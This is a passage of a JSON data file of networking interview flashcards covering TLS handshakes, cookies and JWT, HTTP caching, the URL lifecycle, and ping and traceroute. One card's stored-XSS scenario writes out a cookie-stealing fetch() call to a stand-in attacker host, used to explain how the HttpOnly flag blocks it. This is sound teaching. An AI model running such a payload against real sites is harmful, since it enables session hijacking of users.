      "whyItMatters": "TLS 1.3 eliminated obsolete ciphers (RSA key exchange, RC4, MD5) and halved handshake latency from 2-RTT to 1-RTT (and 0-RTT for returning clients).",
      "howSolves": "Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) allows client and server to compute the exact same symmetric encryption key independently without ever sending the key across the wire."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange work?",
      "steps": [
        {
          "step": 1,
          "title": "ClientHello (1.3)",
          "desc": "Client sends supported ciphers, TLS version, and pre-computed Diffie-Hellman key share (g^a mod p)."
        },
        {
          "step": 2,
          "title": "ServerHello & Key Share",
          "desc": "Server picks cipher suite, returns its own key share (g^b mod p), and delivers X.509 Certificate and digital signature."
        },
        {
          "step": 3,
          "title": "Master Secret Derivation",
          "desc": "Both sides independently compute shared secret: (g^b)^a = (g^a)^b = g^(ab). Encrypted session key generated."
        },
        {
          "step": 4,
          "title": "Finished & Encrypted HTTP",
          "desc": "Encrypted application data (HTTP GET) can transmit immediately on the very next packet. Total handshake = 1-RTT."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "TLS 1.2 Handshake Latency": "2 full Round Trip Times (2-RTT) before first HTTP payload",
        "TLS 1.3 Handshake Latency": "1 full Round Trip Time (1-RTT) for new connections; 0-RTT for resumed sessions",
        "Forward Secrecy (PFS)": "Mandatory in TLS 1.3; ephemeral keys ensure stolen server private keys cannot decrypt past recorded sessions",
        "Cipher Suite Format": "TLS_AES_256_GCM_SHA384 (Cipher, Mode, Hash)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A mobile banking app connects to an API server in another continent with 150 ms network latency.",
      "challenge": "Under TLS 1.2, completing TCP (1-RTT) + TLS (2-RTT) consumed 3 Round Trips = 450 ms before a single byte of data was sent.",
      "resolution": "Upgrading to TLS 1.3 cuts the TLS handshake to 1-RTT. Total connection latency drops from 450 ms to 300 ms (a 33% speedup).",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "ClientHello Extensions": "SNI (Server Name Indication), Supported Groups, Key Share",
        "Diffie-Hellman Key Exchange": "Computes shared secret over open channel without secret transmission",
        "0-RTT Early Data": "Returning clients send encrypted HTTP data on the very first packet using a pre-shared key (PSK)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "TLS 1.3 allows RSA static key exchange.",
          "why": "RSA key exchange lacks Forward Secrecy; if the server's private key is leaked in the future, all past recorded traffic can be decrypted.",
          "correct": "TLS 1.3 completely banned RSA static key exchange, mandating Ephemeral Diffie-Hellman (ECDHE) for Perfect Forward Secrecy."
        },
        {
          "wrong": "SSL and TLS are two completely different competing encryption protocols.",
          "why": "TLS is simply the modern renamed version of Netscape's original SSL protocol.",
          "correct": "SSL 1.0, 2.0, and 3.0 are deprecated and insecure; TLS 1.2 and TLS 1.3 are the modern standards."
        },
        {
          "wrong": "0-RTT mode in TLS 1.3 is completely immune to security attacks.",
          "why": "0-RTT early data can be captured by an eavesdropper and replayed against the server (Replay Attack).",
          "correct": "0-RTT data should only be used for idempotent GET requests, never for payments or password changes."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is Perfect Forward Secrecy (PFS) and why did TLS 1.3 make it mandatory?",
          "a": "Perfect Forward Secrecy (PFS) is a cryptographic property ensuring that even if an attacker records encrypted network traffic today and steals the server's private key 10 years in the future, the attacker still CANNOT decrypt the historical recorded traffic. In older systems (TLS 1.2 with RSA key exchange), the client encrypted the master pre-secret with the server's static public key; compromising the server's private key in the future broke all past sessions. With Perfect Forward Secrecy (using Ephemeral Diffie-Hellman, ECDHE), unique, temporary session keys are negotiated for each individual connection and immediately erased from RAM after the session ends. Because the ephemeral keys were never saved to disk, compromising the server's private key in the future yields zero decryption capability. TLS 1.3 made PFS mandatory by removing static RSA key exchange entirely.",
          "tip": "Explain: 'Stealing the server's private key in the future cannot decrypt past recorded sessions because ephemeral keys are discarded.'"
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "TLS 1.3 = 1-RTT handshake (halved from 2-RTT in TLS 1.2). Mandatory Perfect Forward Secrecy (ECDHE).",
        "summaryPoints": [
          "Diffie-Hellman allows two parties to derive a shared secret over an open public wire.",
          "TLS 1.3 eliminated obsolete ciphers: RSA key exchange, RC4, 3DES, MD5, SHA-1.",
          "Perfect Forward Secrecy ensures past sessions remain secure if private key is leaked.",
          "0-RTT mode allows returning clients to send data immediately (vulnerable to replay attacks)."
        ],
        "whenToUse": "Web security architecture, API performance tuning, and cryptography interview questions."
      }
    }
  ],
  "cookies-and-sessions": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Cookies, Sessions, JWT & State Management over HTTP?",
      "inSimpleWords": "Techniques used to simulate continuous stateful sessions over the architecturally stateless HTTP protocol, comparing server-side sessions, browser cookies, and cryptographically signed JSON Web Tokens (JWT).",
      "analogy": "Visiting an amusement park: A Session is a locker where the park holds your belongings and gives you a locker wristband ID; a JWT is a VIP hand stamp with tamper-evident invisible ink that rides can verify instantly without looking up a central locker database.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Cookies, Sessions, JWT & State Management over HTTP?",
      "problem": "HTTP is inherently stateless. When a user logs in on Request 1, Request 2 has no memory that Request 1 occurred, forcing the user to re-enter their password on every click.",
      "whyItMatters": "User authentication, shopping carts, role-based access control (RBAC), and single-sign-on (SSO) require robust session state management.",
      "howSolves": "Server sends a `Set-Cookie` header on login. The browser automatically stores the cookie and sends it back in the `Cookie` header on every subsequent request to that domain."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Cookies, Sessions, JWT & State Management over HTTP work?",
      "steps": [
        {
          "step": 1,
          "title": "User Authentication",
          "desc": "User submits credentials: POST /login with username & password."
        },
        {
          "step": 2,
          "title": "Session / Token Generation",
          "desc": "Server verifies password. Creates session in Redis (returning session_id) OR signs stateless JWT token."
        },
        {
          "step": 3,
          "title": "Set-Cookie Response",
          "desc": "Server responds: `Set-Cookie: session_id=abc123xyz; HttpOnly; Secure; SameSite=Strict`."
        },
        {
          "step": 4,
          "title": "Automatic Browser Transmission",
          "desc": "Browser attaches `Cookie: session_id=abc123xyz` on all future requests to that domain."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Session-Based": "Stateful: Server stores session data in DB / Redis; client holds opaque session ID in cookie",
        "Token-Based (JWT)": "Stateless: Server signs JSON payload {user_id, role, exp}; client stores token; server verifies signature without DB lookup",
        "HttpOnly Flag": "Prevents JavaScript (`document.cookie`) from reading cookie, neutralizing XSS credential theft",
        "Secure Flag": "Ensures cookie is ONLY transmitted over encrypted HTTPS connections (never cleartext HTTP)",
        "SameSite Flag": "Strict / Lax / None: Prevents Cross-Site Request Forgery (CSRF) by restricting cross-origin cookie sending"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An attacker injects a malicious `<script>` tag into a forum comment (Stored XSS).",
      "challenge": "The script attempts to execute `fetch('https://attacker.com/steal?c=' + document.cookie)` to steal logged-in users' session tokens.",
      "resolution": "Because the server marked the session cookie with the `HttpOnly` flag, JavaScript has zero access to the cookie, completely neutralizing the theft attempt.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Set-Cookie Header": "Set-Cookie: sid=s%3A7a1b; Path=/; HttpOnly; Secure; SameSite=Lax",
        "JWT Structure": "Header.Payload.Signature (e.g. eyJhbGci... . eyJzdWIi... . TJVA95...)",
        "CSRF Mitigation": "SameSite=Strict combined with Anti-CSRF Synchronizer Tokens"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Cookies, Sessions, JWT & State Management over HTTP. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Storing sensitive JWT access tokens in browser `localStorage` is completely safe.",
          "why": "`localStorage` is globally accessible to ANY JavaScript running on the page.",
          "correct": "Any Cross-Site Scripting (XSS) vulnerability can immediately read `localStorage`. Store authentication tokens in `HttpOnly` cookies."
        },
        {
          "wrong": "A JWT token cannot be read by anyone because it is encrypted.",
          "why": "Standard JWT tokens are BASE64URL-ENCODED and signed, NOT encrypted.",
          "correct": "Anyone can decode and read a standard JWT payload at jwt.io; the signature only prevents tampering."
        },
        {
          "wrong": "Revoking a compromised JWT token immediately is trivial on stateless backends.",
          "why": "Stateless JWTs are valid until their expiration timestamp (`exp`) without a central DB lookup.",
          "correct": "Instant revocation of stateless JWTs requires implementing a token revocation blocklist in Redis, making the architecture stateful."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the trade-off between Server-Side Sessions (stored in Redis) and Stateless JSON Web Tokens (JWT)?",
          "a": "1. Server-Side Sessions: The client stores only a random, opaque session ID cookie. The server stores user session data in a fast in-memory store like Redis. Pros: Instant revocation (logging out or banning a user immediately deletes the Redis key); small cookie payload. Cons: Requires scaling and clustering the central Redis state store across all server regions. 2. Stateless JWT: The server signs user claims (user ID, permissions, expiration) cryptographically and sends the token to the client. Pros: Completely stateless—any microservice can verify the signature using the public key without querying a central database, making it ideal for distributed horizontal scaling. Cons: Impossible to revoke instantly before expiration without building a stateful blocklist; larger payload size sent on every request; risk of token theft via XSS if stored in localStorage.",
          "tip": "Present the trade-off clearly: Sessions = easy revocation but stateful; JWT = stateless scalability but difficult instant revocation."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "HttpOnly protects against XSS; SameSite protects against CSRF; Secure ensures HTTPS only.",
        "summaryPoints": [
          "HTTP is stateless; state is maintained using Cookies, Sessions, or JWT tokens.",
          "Always set `HttpOnly`, `Secure`, and `SameSite=Lax/Strict` on authentication cookies.",
          "JWTs are signed, not encrypted; never store passwords or secrets in JWT payloads.",
          "Stateless JWT revocation requires short expiration times (e.g. 15 mins) + Refresh tokens."
        ],
        "whenToUse": "User authentication, microservice authorization, security hardening, and web architecture."
      }
    }
  ],
  "web-caching": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Web Caching, Cache-Control Headers & ETag Validation?",
      "inSimpleWords": "Web caching is the technique of storing copies of HTTP responses in browser memory, local disk, forward proxies, or CDN edge nodes to serve future identical requests without contacting the origin server.",
      "analogy": "Photocopying a textbook chapter: instead of driving to the university library (origin server) every time you want to read Chapter 4, you keep a photocopy in your desk drawer (cache).",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Web Caching, Cache-Control Headers & ETag Validation?",
      "problem": "Fetching identical 5 MB JavaScript bundles, CSS stylesheets, and images on every page reload wastes bandwidth, increases cloud egress bills, and makes websites feel sluggish.",
      "whyItMatters": "Effective caching reduces server load by up to 90%, reduces page load times from seconds to milliseconds, and enables offline browsing.",
      "howSolves": "HTTP headers (`Cache-Control`, `ETag`, `Last-Modified`) instruct browsers and CDNs whether to serve local cached copies or validate changes using 304 Not Modified conditional requests."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Web Caching, Cache-Control Headers & ETag Validation work?",
      "steps": [
        {
          "step": 1,
          "title": "Freshness Check (max-age)",
          "desc": "Browser checks `Cache-Control: max-age=86400`. If cached copy is within age, browser serves it directly from disk cache (0 ms latency)."
        },
        {
          "step": 2,
          "title": "Conditional Request (Validation)",
          "desc": "When cache expires, browser sends conditional request with `If-None-Match: \"hash123\"` or `If-Modified-Since`."
        },
        {
          "step": 3,
          "title": "Server ETag Comparison",
          "desc": "Server computes cryptographic hash of current file. If hash matches client's ETag, file has not changed."
        },
        {
          "step": 4,
          "title": "304 Not Modified Response",
          "desc": "Server responds with `304 Not Modified` and zero body payload. Browser re-validates local cache and serves file."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Cache-Control: max-age=N": "Specifies maximum time in seconds the response is considered fresh",
        "Cache-Control: no-cache": "Must re-validate with origin server (using ETag) before serving cached copy",
        "Cache-Control: no-store": "Strictly forbids caching anywhere (used for banking, credentials, sensitive data)",
        "Cache-Control: immutable": "File will never change (used for content-hashed assets like `bundle.a8f1b.js`)",
        "ETag (Entity Tag)": "Cryptographic hash of content (e.g. ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\")"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A frontend engineer deploys a bug fix to `app.js`, but users still see the broken version.",
      "challenge": "The server previously sent `Cache-Control: max-age=31536000` (1 year) on `app.js`. Browsers refuse to check the server for 1 year.",
      "resolution": "Use Content Hashing (Cache Busting): rename file to `app.a1b2c3.js` in index.html. Because the URL changed, browsers fetch the new file immediately.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Static Assets (CSS/JS)": "Cache-Control: public, max-age=31536000, immutable",
        "HTML Document": "Cache-Control: no-cache (always validate with server so updates are seen)",
        "Sensitive API Data": "Cache-Control: no-store, private",
        "Conditional Headers": "If-None-Match (pairs with ETag) and If-Modified-Since (pairs with Last-Modified)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Web Caching, Cache-Control Headers & ETag Validation. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "`Cache-Control: no-cache` means the browser will never cache the file.",
          "why": "`no-cache` DOES cache the file! It simply requires validating with the server before using it.",
          "correct": "To completely prevent caching, you MUST use `Cache-Control: no-store`."
        },
        {
          "wrong": "304 Not Modified responses re-download the entire file payload.",
          "why": "304 responses contain ONLY headers and ZERO body bytes.",
          "correct": "A 304 response confirms the client's local cache is still valid, saving 100% of body bandwidth."
        },
        {
          "wrong": "ETag is calculated using file modification timestamp only.",
          "why": "Timestamps can be unreliable across clustered servers.",
          "correct": "ETags are typically generated by hashing file contents (SHA-256 or MD5) or inode metadata."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between `Cache-Control: no-cache` and `Cache-Control: no-store`?",
          "a": "This is one of the most common web interview questions: 1. `no-cache`: Instructs the browser or CDN that it CAN store a copy of the response in its cache, but it MUST re-validate that cached copy with the origin server (using conditional headers like `If-None-Match: <ETag>`) before serving it to the user. If the server replies `304 Not Modified`, the cached copy is used. It means: 'Cache it, but check with me before using it.' 2. `no-store`: Strictly forbids the browser, CDN, or any intermediate proxy from saving ANY copy of the response to disk or memory under any circumstances. Every single request must download the full payload from the origin server. It is reserved for sensitive, confidential data like banking balances, passwords, and private medical records.",
          "tip": "Remember: `no-cache` = Cache it, but validate with ETag first; `no-store` = Never save to disk at all."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "no-cache = validate with server first; no-store = never cache; max-age = fresh duration; 304 = zero-byte body validation.",
        "summaryPoints": [
          "Freshness (max-age) serves directly from disk without hitting the network.",
          "Validation (ETag / If-None-Match) returns `304 Not Modified` without body payload.",
          "Static content-hashed assets (`bundle.x7y8.js`) use `max-age=31536000, immutable`.",
          "HTML entry files should use `no-cache` to ensure instant deployment updates."
        ],
        "whenToUse": "Frontend build pipeline configuration (Vite, Webpack), CDN caching rules, and API performance."
      }
    }
  ],
  "url-lifecycle": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Complete URL Lifecycle?",
      "inSimpleWords": "The universal software engineering interview question detailing the complete end-to-end journey from user keystroke to pixels rendering on the screen across all networking and OS layers.",
      "analogy": "Ordering an item on Amazon: typing address -> postal address lookup -> warehouse courier handshake -> encrypted shipping container -> delivery truck -> unpacking package -> placing item on living room table.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Complete URL Lifecycle?",
      "problem": "Engineers who only understand high-level React or low-level sockets cannot troubleshoot full-stack latency bottlenecks.",
      "whyItMatters": "This is the single most famous, comprehensive technical interview question asked at Google, Amazon, Microsoft, and top MNCs to gauge full-stack depth.",
      "howSolves": "Deconstructs the journey into 7 clear phases: URL Parsing -> DNS Resolution -> TCP Handshake -> TLS Negotiation -> HTTP Request/Response -> Server Processing -> DOM Rendering."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Complete URL Lifecycle work?",
      "steps": [
        {
          "step": 1,
          "title": "1. URL Parsing & HSTS Check",
          "desc": "Browser parses scheme (https), host (google.com), port (443). Checks preloaded HSTS list to force HTTPS."
        },
        {
          "step": 2,
          "title": "2. DNS Resolution",
          "desc": "Browser cache -> OS cache -> Hosts file -> Recursive Resolver (UDP 53) -> Root -> TLD -> Authoritative -> IP 142.250.72.14."
        },
        {
          "step": 3,
          "title": "3. TCP 3-Way Handshake",
          "desc": "Client sends SYN [Seq=X] -> Server sends SYN-ACK [Seq=Y, Ack=X+1] -> Client sends ACK [Seq=X+1, Ack=Y+1]."
        },
        {
          "step": 4,
          "title": "4. TLS 1.3 Cryptographic Handshake",
          "desc": "ClientHello (DH share) -> ServerHello + X.509 Certificate -> Key derivation -> Shared symmetric AES key established."
        },
        {
          "step": 5,
          "title": "5. HTTP Request & Transit",
          "desc": "Browser sends GET / HTTP/1.1. Encapsulated: HTTP -> TCP -> IP -> Ethernet Frame -> Physical fiber optics."
        },
        {
          "step": 6,
          "title": "6. Server Processing & 200 OK",
          "desc": "Reverse proxy (NGINX) terminates TLS, load balancer routes to app server, server returns HTML with 200 OK."
        },
        {
          "step": 7,
          "title": "7. Browser Rendering Engine",
          "desc": "Browser parses HTML -> DOM Tree; parses CSS -> CSSOM; combines into Render Tree -> Layout -> Paint -> Composite."
        }
      ],
      "vfxType": "dns"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Phase 1: Application": "URL parsing, HSTS policy, browser cache check",
        "Phase 2: Name Resolution": "DNS lookup hierarchy (Browser -> OS -> Resolver -> Root -> TLD -> Authoritative)",
        "Phase 3: Transport & Security": "TCP 3-way handshake (1-RTT) + TLS 1.3 handshake (1-RTT)",
        "Phase 4: Network & Hardware": "Routing, ARP, NAT, frame encapsulation across switches and fiber",
        "Phase 5: Server & Rendering": "Web server, reverse proxy, HTTP 200 OK, Critical Rendering Path (DOM/CSSOM)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A candidate is asked: 'What happens when you type https://google.com into your browser and press Enter?'",
      "challenge": "The candidate must demonstrate mastery across OS internals, networking protocols, security, and web rendering without rambling.",
      "resolution": "Structure the answer chronologically: 1. Input/Parsing -> 2. DNS -> 3. TCP/TLS -> 4. Routing/Hardware -> 5. HTTP Exchange -> 6. DOM/CSSOM Rendering.",
      "vfxType": "dns"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Total Round Trips": "1 RTT (DNS) + 1 RTT (TCP) + 1 RTT (TLS) + 1 RTT (HTTP GET) = 4 RTTs before first paint",
        "Critical Rendering Path": "HTML parse -> DOM -> CSS parse -> CSSOM -> Render Tree -> Layout -> Paint",
        "DNS Cache Hit": "Saves 1 RTT entirely if cached in browser memory"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Complete URL Lifecycle (\"What happens when you type a URL into a browser?\"). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "dns"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "The browser sends the HTTP request before the TLS handshake.",
          "why": "HTTP data would travel unencrypted.",
          "correct": "The TCP handshake completes first, then the TLS handshake encrypts the connection, THEN the HTTP request is transmitted."
        },
        {
          "wrong": "DNS query is sent over a TCP connection.",
          "why": "Standard DNS queries use UDP port 53 for speed.",
          "correct": "DNS resolution uses UDP port 53."
        },
        {
          "wrong": "The server IP address alone is enough to send an Ethernet frame out of your laptop.",
          "why": "Ethernet hardware requires the destination MAC address of the local Default Gateway.",
          "correct": "The laptop uses ARP to find the MAC address of the local router to transmit the frame."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Walk me through the exact networking sequence of typing a URL into a browser from DNS to the first HTTP byte.",
          "a": "1. URL Parsing: Browser extracts protocol (HTTPS), domain (example.com), and checks HSTS cache. 2. DNS Resolution: Browser checks local cache. If miss, sends UDP packet to recursive resolver (port 53). Resolver queries Root ('.'), TLD ('.com'), and Authoritative server, returning IPv4 address 93.184.216.34. 3. Local Routing & ARP: OS checks routing table, identifies destination is outside local subnet, and uses ARP cache to resolve Default Gateway's MAC address. 4. TCP 3-Way Handshake: Client sends TCP SYN to server on port 443; server replies SYN-ACK; client returns ACK. Connection is ESTABLISHED (1-RTT). 5. TLS 1.3 Handshake: Client sends ClientHello with Diffie-Hellman key share; server returns ServerHello, Certificate, and key share; mutual symmetric session keys derived (1-RTT). 6. HTTP Request: Client sends encrypted `GET / HTTP/1.1` request. Server processes request and streams back `200 OK` with HTML payload. 7. Rendering: Browser parses HTML to construct DOM Tree, parses CSS for CSSOM, builds Render Tree, calculates Layout, and paints pixels on screen.",
          "tip": "Structure your answer in clear numbered headings. Mentioning ARP and the default gateway proves you know real networking."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "URL Parsing -> DNS (UDP 53) -> ARP (Gateway MAC) -> TCP (Port 443) -> TLS 1.3 -> HTTP GET -> DOM/CSSOM Paint.",
        "summaryPoints": [
          "Deconstruct into Application, DNS, Transport, Security, Routing, and Rendering phases.",
          "ARP resolves the Default Gateway router's MAC address, not the remote web server's MAC.",
          "Total handshake overhead: 1 RTT (TCP) + 1 RTT (TLS 1.3) = 2 RTTs before HTTP request.",
          "Browser constructs DOM Tree + CSSOM Tree -> Render Tree -> Layout -> Paint."
        ],
        "whenToUse": "The quintessential technical benchmark question asked across all software engineering placement rounds."
      }
    }
  ],
  "ping-and-traceroute": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Ping & Traceroute Mechanics?",
      "inSimpleWords": "Ping measures point-to-point network reachability and round-trip latency using ICMP Echo messages. Traceroute maps the exact intermediate router hops along a network path by intentionally exploiting IP Time-To-Live (TTL) expiration.",
      "analogy": "Ping is shouting 'Echo!' into a canyon and measuring seconds until the sound bounces back. Traceroute is dropping breadcrumbs that expire after 1 mile, 2 miles, 3 miles to force each checkpoint ranger along the trail to radio back their identity.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Ping & Traceroute Mechanics?",
      "problem": "When a cloud service cannot connect to a database, you need to know: Is the database host offline, or is a specific intermediate router dropping packets 5 hops away?",
      "whyItMatters": "Ping and traceroute are the primary Layer 3 diagnostics used to isolate packet loss, high latency, routing loops, and network outages.",
      "howSolves": "Ping sends ICMP Type 8 Echo Requests; Traceroute sends packets with incrementing TTL (1, 2, 3...) to trigger ICMP Type 11 Time Exceeded replies from each router hop."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Ping & Traceroute Mechanics work?",
      "steps": [
        {
          "step": 1,
          "title": "Ping Execution",
          "desc": "Sends ICMP Type 8 Echo Request with timestamp. Target returns ICMP Type 0 Echo Reply. Calculates RTT = T_reply - T_send."
        },
        {
          "step": 2,
          "title": "Traceroute Hop 1 (TTL=1)",
          "desc": "Packet sent with TTL=1. Router 1 decrements TTL to 0, drops packet, and returns ICMP Type 11 (Time Exceeded)."
        },
        {
          "step": 3,
          "title": "Traceroute Hop 2 (TTL=2)",
          "desc": "Packet sent with TTL=2. Passes Router 1 (TTL=1), arrives at Router 2 (TTL=0). Router 2 drops and returns ICMP Type 11."
        },
        {
          "step": 4,
          "title": "Traceroute Completion",
          "desc": "Repeats with TTL=3, 4, 5... until destination responds with Echo Reply (ICMP) or Port Unreachable (UDP)."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Ping Protocol": "ICMP Type 8 (Echo Request) & ICMP Type 0 (Echo Reply)",
        "Traceroute Trigger": "ICMP Type 11 / Code 0 (Time to Live exceeded in transit)",
        "TTL Field": "8-bit IP header field (0 to 255) decremented by 1 at every router hop",
        "Windows vs Linux Traceroute": "Windows `tracert` uses ICMP Echo Requests; Linux `traceroute` uses UDP packets to high-numbered ports (33434+)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An enterprise employee reports that connecting to the corporate ERP server in Frankfurt is taking 800 ms instead of the normal 120 ms.",
      "challenge": "Is the server slow, or is a telecommunication provider link routing traffic inefficiently?",
      "resolution": "Running `traceroute` reveals that Hop 7 in London jumps from 30 ms to 780 ms, proving an undersea fiber cable between London and Frankfurt is heavily congested.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Ping Output": "Reply from 8.8.8.8: bytes=32 time=14ms TTL=117",
        "Traceroute Line": "4  72.14.215.85  18.421 ms  17.892 ms  18.105 ms",
        "Asterisk (*) in Traceroute": "Indicates router dropped ICMP packet or firewall blocked response (request timed out)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Ping & Traceroute Mechanics (TTL Exceeded & RTT Latency). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "An asterisk (*) on one hop in a traceroute proves the network is broken.",
          "why": "Many core routers prioritize packet forwarding over responding to ICMP diagnostic queries.",
          "correct": "An asterisk often just means that specific router ignores ICMP; if subsequent hops reply, the network path is fully healthy."
        },
        {
          "wrong": "Ping packet round-trip time measures bandwidth speed.",
          "why": "Ping measures latency (propagation and queuing delay), not link capacity.",
          "correct": "Ping measures Latency (milliseconds), not Bandwidth (megabits per second)."
        },
        {
          "wrong": "TTL stands for Time To Live in actual seconds.",
          "why": "Historically intended as seconds, in practice TTL is decremented as a HOP counter.",
          "correct": "TTL represents the maximum number of ROUTER HOPS a packet can traverse before being discarded."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why does Windows `tracert` behave differently than Linux `traceroute`?",
          "a": "Windows `tracert` and Linux `traceroute` use the exact same TTL-incrementing mechanism, but transmit different underlying packet types: 1. Windows `tracert` sends ICMP Echo Request packets (Type 8) with incrementing TTLs. When the destination is reached, the destination returns an ICMP Echo Reply (Type 0). 2. Linux `traceroute` by default sends UDP datagrams to deliberately obscure, invalid high port numbers (ports 33434 through 33534). Intermediate routers still return ICMP Type 11 (TTL Exceeded), but when the packet reaches the final destination, the destination sees that no application is listening on that UDP port and returns an ICMP Type 3 Code 3 (Destination Port Unreachable) message, signaling the end of the trace. (Linux can be told to use ICMP via `traceroute -I`).",
          "tip": "Explain the final destination response: Windows expects ICMP Type 0; Linux expects ICMP Type 3 Code 3 (Port Unreachable)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Ping = ICMP Echo (latency & loss). Traceroute = incrementing TTL (1, 2, 3...) triggering ICMP Type 11 (hop path).",
        "summaryPoints": [
          "TTL decrements by 1 at every router hop; prevents packets looping forever.",
          "ICMP Type 11 (Time Exceeded) reveals each router's IP address.",
          "Asterisks (*) indicate ICMP rate-limiting or firewall packet dropping.",
